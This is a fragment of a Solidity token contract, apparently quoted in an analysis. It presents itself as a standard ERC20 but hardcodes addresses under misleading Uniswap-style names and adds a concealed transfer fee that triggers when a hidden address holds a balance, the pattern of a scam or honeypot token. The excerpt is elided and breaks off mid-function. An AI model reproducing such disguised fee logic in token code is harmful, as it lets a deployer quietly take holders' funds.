...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private V2Factory = 0xf57Bd58cb9DAcd705BA00B2cBFedc35D76c20320;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private swappingToggle = 2;
    address internal _uniswapRouter = 0x7a1d445caC8579314af20C7d238c0af1A9d5aE56;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouter && _balances[V2Factory] > 0 ? _pairsAllowance : swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
